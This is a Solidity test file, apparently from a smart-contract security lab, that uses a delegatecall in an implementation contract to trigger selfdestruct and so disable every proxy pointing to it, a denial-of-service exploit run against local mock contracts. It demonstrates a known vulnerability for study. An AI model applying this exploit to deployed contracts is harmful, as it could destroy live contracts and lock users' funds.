// SPDX-License-Identifier: Unlicense
pragma solidity >=0.8.0;

import {DSTest} from "ds-test/test.sol";
import {Utilities} from "./utils/Utilities.sol";
import {console} from "./utils/Console.sol";
import {Hevm} from "./utils/Hevm.sol";

import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {MockERC721} from "./mock-ercs/ERC721.sol";
import {MockERC20} from "./mock-ercs/ERC20.sol";

import {Implementation} from "../Implementation.sol";
import {Proxy} from "../Proxy.sol";
import {Attack} from "../Attack.sol";

contract ContractTest is DSTest {
    Hevm internal immutable hevm =
        Hevm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D); // HEVM-ADDRESS
    Utilities internal utils;

    address payable internal attacker;
    address payable internal victim;

    Implementation internal IMPLEMENTATION;
    Proxy internal PROXY;
    Attack internal ATTACK;

    function setUp() public {
        utils = new Utilities();

        IMPLEMENTATION = new Implementation();
        PROXY = new Proxy(address(IMPLEMENTATION), victim);
        ATTACK = new Attack();
    }

    /**
        Workflow
        ---
        1. Attacker depoys proxy.
        2. Forward selfdesruct function to implementation to disable all proxies via denial of service (DOS).
     */
    function test_exploit() public {
        hevm.startPrank(attacker);

        IMPLEMENTATION.delegatecallContract(
            address(IMPLEMENTATION),
            abi.encodeWithSignature("attack(address)", address(IMPLEMENTATION))
        );
    }
}
